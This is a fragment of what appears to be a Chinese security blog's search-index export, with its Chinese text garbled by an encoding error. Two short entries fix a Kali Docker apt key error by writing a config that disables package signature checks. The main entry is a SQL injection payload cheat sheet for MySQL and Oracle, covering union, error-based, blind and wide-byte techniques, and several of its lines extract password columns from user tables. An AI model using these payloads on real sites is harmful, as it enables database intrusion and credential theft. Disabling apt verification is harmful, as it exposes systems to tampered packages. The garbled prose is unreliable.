      
      
        <tags>
            
            <tag> docker-kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali docker ä½¿ç”¨æ—¶é‡åˆ°çš„å‘</title>
      <link href="/2022/02/18/kali-docker-%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
      <url>/2022/02/18/kali-docker-%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h2 id="å®‰è£…å®˜æ–¹çš„-Docker-Kali-GPG-æ— æ³•éªŒè¯"><a href="#å®‰è£…å®˜æ–¹çš„-Docker-Kali-GPG-æ— æ³•éªŒè¯" class="headerlink" title="å®‰è£…å®˜æ–¹çš„ Docker Kali GPG æ— æ³•éªŒè¯"></a>å®‰è£…å®˜æ–¹çš„ Docker Kali GPG æ— æ³•éªŒè¯</h2><p>åœ¨ä½¿ç”¨2022.1ç‰ˆæœ¬ kalilinux/kali-rolling çš„æ—¶å€™ï¼Œapt update ä¼šæŠ¥ä»¥ä¸‹éªŒè¯é”™è¯¯ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line">root@28593cafb270:/# apt <span class="hljs-keyword">update</span></span><span class="line">Get:1 http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease [30.6 kB]</span></span><span class="line"><span class="hljs-keyword">Err</span>:1 http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease</span></span><span class="line">  The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY ED444FF07D8D0BF6</span><span class="line">Reading package lists... Done</span><span class="line">W: http:<span class="hljs-comment">//http.kali.org/kali/dists/kali-rolling/InRelease: The key(s) in the keyring /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg are ignored as the file is not readable by user &#x27;_apt&#x27; executing apt-key.</span></span><span class="line">...</span><span class="line">W: GPG <span class="hljs-keyword">error</span>: http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease: The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY ED444FF07D8D0BF6</span></span><span class="line"><span class="hljs-keyword">E</span>: The repository &#x27;http:<span class="hljs-comment">//http.kali.org/kali kali-rolling InRelease&#x27; is not signed.</span></span><span class="line"><span class="hljs-keyword">N</span>: Updating from such a repository can&#x27;t be done securely, and is therefore disabled <span class="hljs-keyword">by</span> default.</span><span class="line"><span class="hljs-keyword">N</span>: See apt-secure(8) manpage <span class="hljs-keyword">for</span> repository creation and user configuration details.</span></code></pre></div></div><p>è§£å†³åŠæ³•å‰å¾€<a href="/2022/02/18/kali-docker-apt-gpg-%E9%AA%8C%E8%AF%81%E5%A4%B1%E8%B4%A5/" title="kali docker apt gpg éªŒè¯å¤±è´¥">kali docker apt gpg éªŒè¯å¤±è´¥</a></p>]]></content>
      
      
      <categories>
          
          <category> ç³»ç»Ÿ </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker-kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali docker apt gpg éªŒè¯å¤±è´¥</title>
      <link href="/2022/02/18/kali-docker-apt-gpg-%E9%AA%8C%E8%AF%81%E5%A4%B1%E8%B4%A5/"/>
      <url>/2022/02/18/kali-docker-apt-gpg-%E9%AA%8C%E8%AF%81%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="é”™è¯¯ä¿¡æ¯"><a href="#é”™è¯¯ä¿¡æ¯" class="headerlink" title="é”™è¯¯ä¿¡æ¯"></a>é”™è¯¯ä¿¡æ¯</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line">root@28593cafb270:/# apt <span class="hljs-keyword">update</span></span><span class="line">Get:1 http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease [30.6 kB]</span></span><span class="line"><span class="hljs-keyword">Err</span>:1 http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease</span></span><span class="line">  The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY ED444FF07D8D0BF6</span><span class="line">Reading package lists... Done</span><span class="line">W: http:<span class="hljs-comment">//http.kali.org/kali/dists/kali-rolling/InRelease: The key(s) in the keyring /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg are ignored as the file is not readable by user &#x27;_apt&#x27; executing apt-key.</span></span><span class="line">...</span><span class="line">W: GPG <span class="hljs-keyword">error</span>: http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease: The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY ED444FF07D8D0BF6</span></span><span class="line"><span class="hljs-keyword">E</span>: The repository &#x27;http:<span class="hljs-comment">//http.kali.org/kali kali-rolling InRelease&#x27; is not signed.</span></span><span class="line"><span class="hljs-keyword">N</span>: Updating from such a repository can&#x27;t be done securely, and is therefore disabled <span class="hljs-keyword">by</span> default.</span><span class="line"><span class="hljs-keyword">N</span>: See apt-secure(8) manpage <span class="hljs-keyword">for</span> repository creation and user configuration details.</span></code></pre></div></div><h2 id="å°è¯•1"><a href="#å°è¯•1" class="headerlink" title="å°è¯•1"></a>å°è¯•1</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys ED444FF07D8D0BF6</span></code></pre></div></div><p>ä½†æ˜¯æ–°dockeræ²¡æœ‰å®‰è£…<code>gnupg</code>ä¼šæŠ¥<code>E: gnupg, gnupg2 and gnupg1 do not seem to be installed, but one of them is required for this operation</code>é”™è¯¯ã€‚</p><p>è¦æƒ³å®‰è£…<code>gnupg</code>åˆ™éœ€è¦æ›´æ–°apt, è¿›å…¥æ­»å¾ªç¯</p><h2 id="å°è¯•2"><a href="#å°è¯•2" class="headerlink" title="å°è¯•2"></a>å°è¯•2</h2><p>å¼ºè¡Œè·å–å¯†é’¥ç„¶åå®‰è£…</p><p>æ–¹æ³•æ˜¯ä¸‹è½½æœ€æ–°çš„<code>kali-archive-keyring</code>ï¼Œç”±äºæ— æ³•ä½¿ç”¨aptï¼Œæ‰€ä»¥æ‰‹åŠ¨ä¸‹è½½ã€‚<br>æœ€æ–°çš„åˆ°<code>http://http.kali.org/pool/main/k/kali-archive-keyring</code>æŸ¥çœ‹</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">wget http://http.kali.org/pool/main/k/kali-archive-keyring/kali-archive-keyring_2022.1_all.deb</span><span class="line">apt install ./kali-archive-keyring_2022.1_all.deb</span></code></pre></div></div><p>ç”±äºdocker-kaliæ²¡æœ‰wgetï¼Œåªèƒ½åœ¨ä¸»æœºä¸‹è½½å¥½åæŒ‚è½½åˆ°docker-kaliä¸Šå®‰è£…ã€‚</p><p>ä½†å…¶å®å®˜æ–¹çš„keyringå·²ç»æ˜¯æœ€æ–°çš„äº†ï¼Œè¿™ä¸ªå°è¯•æ˜¯æ— æ•ˆçš„ã€‚</p><h2 id="æœ€ç»ˆæ— å¥ˆçš„é€‰æ‹©"><a href="#æœ€ç»ˆæ— å¥ˆçš„é€‰æ‹©" class="headerlink" title="æœ€ç»ˆæ— å¥ˆçš„é€‰æ‹©"></a>æœ€ç»ˆæ— å¥ˆçš„é€‰æ‹©</h2><p>å› ä¸ºåŸå› æ˜¯ä¸èƒ½éªŒè¯ï¼Œé‚£ä¹ˆå°±å¿½ç•¥éªŒè¯å°±å¯ä»¥äº†</p><ul><li>å‚è€ƒçš„æ˜¯<a href="https://askubuntu.com/questions/74345/how-do-i-bypass-ignore-the-gpg-signature-checks-of-apt">è¿™ä¸€ç¯‡è®¨è®º</a></li></ul><p>åˆ›å»º<code>/etc/apt/apt.conf.d/99allow_unauth</code>æ–‡ä»¶å¹¶å°†<code>gpg-pubkey</code>è®¾ç½®ä¸ºå¿½ç•¥</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;APT &#123; Get &#123; AllowUnauthenticated &quot;1&quot;; &#125;; &#125;; Acquire &#123; AllowInsecureRepositories &quot;1&quot;; AllowDowngradeToInsecureRepositories &quot;1&quot;; &#125;;&#x27;</span> &gt; /etc/apt/apt.conf.d/99allow_unauth</span></code></pre></div></div><p>æ­¤æ—¶å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï¼Œåªä¸è¿‡ä¼šæœ‰<code>Warning</code>ï¼Œè¿™ä¹Ÿæ˜¯æ²¡åŠæ³•çš„ä¸€ä¸ªåŠæ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç³»ç»Ÿ </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker-kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql æ³¨å…¥åˆé›†</title>
      <link href="/2022/02/11/sql-%E6%B3%A8%E5%85%A5%E5%90%88%E9%9B%86/"/>
      <url>/2022/02/11/sql-%E6%B3%A8%E5%85%A5%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><strong>SQLæ³¨å…¥çš„æ”»å‡»æ–¹å¼æ ¹æ®åº”ç”¨ç¨‹åºå¤„ç†æ•°æ®åº“è¿”å›å†…å®¹çš„ä¸åŒï¼Œå¯ä»¥åˆ†ä¸ºå¯æ˜¾æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥å’Œç›²æ³¨ã€‚æœ¬ç¯‡æ€»ç»“çš„å¾ˆå…¨äº†ï¼Œå°¤å…¶æ˜¯æ–°æ‰‹è€Œè¨€ï¼Œå¾ˆæœ‰ç”¨.</strong></p><p><strong>å¯æ˜¾æ³¨å…¥</strong></p><p>æ”»å‡»è€…å¯ä»¥ç›´æ¥åœ¨å½“å‰ç•Œé¢å†…å®¹ä¸­è·å–æƒ³è¦è·å¾—çš„å†…å®¹ã€‚</p><p><strong>æŠ¥é”™æ³¨å…¥</strong></p><p>æ•°æ®åº“æŸ¥è¯¢è¿”å›ç»“æœå¹¶æ²¡æœ‰åœ¨é¡µé¢ä¸­æ˜¾ç¤ºï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºå°†æ•°æ®åº“æŠ¥é”™ä¿¡æ¯æ‰“å°åˆ°äº†é¡µé¢ä¸­ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥æ„é€ æ•°æ®åº“æŠ¥é”™è¯­å¥ï¼Œä»æŠ¥é”™ä¿¡æ¯ä¸­è·å–æƒ³è¦è·å¾—çš„å†…å®¹ã€‚</p><p><strong>ç›²æ³¨</strong></p><p>æ•°æ®åº“æŸ¥è¯¢ç»“æœæ— æ³•ä»ç›´è§‚é¡µé¢ä¸­è·å–ï¼Œæ”»å‡»è€…é€šè¿‡ä½¿ç”¨æ•°æ®åº“é€»è¾‘æˆ–ä½¿æ•°æ®åº“åº“æ‰§è¡Œå»¶æ—¶ç­‰æ–¹æ³•è·å–æƒ³è¦è·å¾—çš„å†…å®¹ã€‚</p><h2 id="Mysql-æ‰‹å·¥æ³¨å…¥"><a href="#Mysql-æ‰‹å·¥æ³¨å…¥" class="headerlink" title="Mysql æ‰‹å·¥æ³¨å…¥"></a><strong>Mysql æ‰‹å·¥æ³¨å…¥</strong></h2><h3 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a><strong>è”åˆæ³¨å…¥</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 4--+</span></span><span class="line"><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,database()<span class="hljs-comment">--+</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span></span><span class="line"><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot; <span class="hljs-comment">--+</span></span><span class="line">group_concat(column_name) å¯æ›¿æ¢ä¸º unhex(Hex(<span class="hljs-built_in">cast</span>(column_name<span class="hljs-operator">+</span><span class="hljs-keyword">as</span><span class="hljs-operator">+</span><span class="hljs-type">char</span>)))column_name</span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3,group_concat(password) from users --+</span></span><span class="line"><span class="hljs-string">group_concat å¯æ›¿æ¢ä¸º concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,id,users,password )</span></span><span class="line"><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-comment">--+</span></span></code></pre></div></div><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a><strong>æŠ¥é”™æ³¨å…¥</strong></h3><p>1.floor()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-keyword">user</span>(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);</span></code></pre></div></div><p>2.extractvalue()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));</span></code></pre></div></div><p>3.updatexml()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));</span></code></pre></div></div><p>4.geometrycollection()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> geometrycollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>5.multipoint()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>6.polygon()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>7.multipolygon()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>8.linestring()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>9.multilinestring()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>10.exp()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));</span></code></pre></div></div><p>çˆ†åº“ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +</span></span></code></pre></div></div><p>çˆ†è¡¨ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; limit 3,1),1) -- +</span></span></code></pre></div></div><p>çˆ†å­—æ®µï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +</span></span></code></pre></div></div><p>çˆ†æ•°æ®ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +</span></span><span class="line"><span class="hljs-string">concat ä¹Ÿå¯ä»¥æ”¾åœ¨å¤–é¢ updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</span></span></code></pre></div></div><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a><strong>ç›²æ³¨</strong></h3><p><strong>æ—¶é—´ç›²æ³¨</strong></p><p>å¸¸ç”¨å‡½æ•° <code>sleep()</code></p><p>åˆ†å‰²å‡½æ•° <code>substr</code>ã€<code>substring</code>ã€<code>left</code></p><p>åˆ†å‰²å‡½æ•°ç¼–ç åå¯ä¸ç”¨å¼•å·ï¼Œascii() hex()</p><p>ä¸€èˆ¬æ—¶é—´ç›²æ³¨æˆ‘ä»¬è¿˜éœ€è¦ä½¿ç”¨æ¡ä»¶åˆ¤æ–­å‡½æ•°</p><p>ifï¼ˆexpre1ï¼Œexpre2ï¼Œexpre3ï¼‰</p><p>å½“ expre1 ä¸º true æ—¶ï¼Œè¿”å› expre2ï¼Œfalse æ—¶ï¼Œè¿”å› expre3</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> if((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;r&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></span></code></pre></div></div><p><strong>å¸ƒå°”ç›²æ³¨</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select user()),1,1)=&#x27;</span>r<span class="hljs-string">&#x27; -- +</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> IFNULL((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;r&#x27;</span>),<span class="hljs-number">0</span>) <span class="hljs-comment">-- +</span></span></code></pre></div></div><p>//å¦‚æœ IFNULL ç¬¬ä¸€ä¸ªå‚æ•°çš„è¡¨è¾¾å¼ä¸º NULLï¼Œåˆ™è¿”å›ç¬¬äºŒä¸ªå‚æ•°çš„å¤‡ç”¨å€¼ï¼Œä¸ä¸º Null åˆ™è¾“å‡ºå€¼</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and strcmp((substr((select user()),1,1)=&#x27;</span>r<span class="hljs-string">&#x27;),1) -- +</span></span></code></pre></div></div><p>//è‹¥æ‰€æœ‰çš„å­—ç¬¦ä¸²å‡ç›¸åŒï¼Œ<code>STRCMP()</code> è¿”å› 0ï¼Œè‹¥æ ¹æ®å½“å‰åˆ†ç±»æ¬¡åºï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°äºç¬¬äºŒä¸ªï¼Œåˆ™è¿”å› -1 ï¼Œå…¶å®ƒæƒ…å†µè¿”å› 1  </p><h3 id="insert-delete-update"><a href="#insert-delete-update" class="headerlink" title="insert,delete,update"></a><strong>insert,delete,update</strong></h3><p>è¿™ç§æ³¨å…¥ä¼šå‡ºç°åœ¨ æ³¨å†Œã€ipå¤´ã€ç•™è¨€æ¿ç­‰ç­‰éœ€è¦å†™å…¥æ•°æ®çš„åœ°æ–¹ï¼Œå¦‚ç”¨sqlmapä¼šäº§ç”Ÿå¤§é‡åƒåœ¾æ•°æ®</p><p>å°è¯•æ€§æ’å…¥ã€å¼•å·ã€åŒå¼•å·ã€è½¬ä¹‰ç¬¦ <code>\\</code> è®©è¯­å¥ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œç„¶åå¦‚æœæ’å…¥å¤±è´¥ï¼Œæ›´æ–°å¤±è´¥ï¼Œç„¶åæ·±å…¥æµ‹è¯•ç¡®å®šæ˜¯å¦å­˜åœ¨æ³¨å…¥</p><h3 id="äºŒæ¬¡æ³¨å…¥å’Œå®½å­—èŠ‚æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥å’Œå®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥å’Œå®½å­—èŠ‚æ³¨å…¥"></a><strong>äºŒæ¬¡æ³¨å…¥å’Œå®½å­—èŠ‚æ³¨å…¥</strong></h3><p><strong>äºŒæ¬¡æ³¨å…¥</strong>ï¼š</p><p>æ²¡æœ‰å•å¼•å·çš„sqlè¯­å¥ä¸­ï¼Œè¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼Œè¿™æ ·å°±ä¸ä¼šå¸¦æœ‰å•å¼•å·</p><p><strong>å®½å­—èŠ‚æ³¨å…¥ï¼š</strong></p><p>å•å¼•å·è½¬ä¹‰ä¸º <code>&#39;</code> , mysql ä¼šå°† <code>\\</code> ç¼–ç ä¸º <code>%5c</code> ï¼Œå®½å­—èŠ‚ä¸­ä¸¤ä¸ªå­—èŠ‚ä»£è¡¨ä¸€ä¸ªæ±‰å­—</p><p>æ‰€ä»¥æŠŠ <code>%df</code> åŠ ä¸Š <code>%5c</code> å°±å˜æˆäº†ä¸€ä¸ªæ±‰å­—â€œé‹â€ï¼Œä»è€Œç»•è¿‡è½¬ä¹‰</p><h2 id="Oracle-æ‰‹å·¥æ³¨å…¥"><a href="#Oracle-æ‰‹å·¥æ³¨å…¥" class="headerlink" title="Oracle æ‰‹å·¥æ³¨å…¥"></a><strong>Oracle æ‰‹å·¥æ³¨å…¥</strong></h2><h3 id="è”åˆæ³¨å…¥-1"><a href="#è”åˆæ³¨å…¥-1" class="headerlink" title="è”åˆæ³¨å…¥"></a><strong>è”åˆæ³¨å…¥</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select user,null from dual--</span></span><span class="line"><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> version,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> v$instance<span class="hljs-comment">--</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--</span></span><span class="line"><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> column_name,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> rownum <span class="hljs-keyword">as</span> limit,column_name <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> table_name <span class="hljs-operator">=</span><span class="hljs-string">&#x27;USERS&#x27;</span>) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">2</span>)<span class="hljs-comment">--</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select username,passwd from users--</span></span><span class="line"><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span 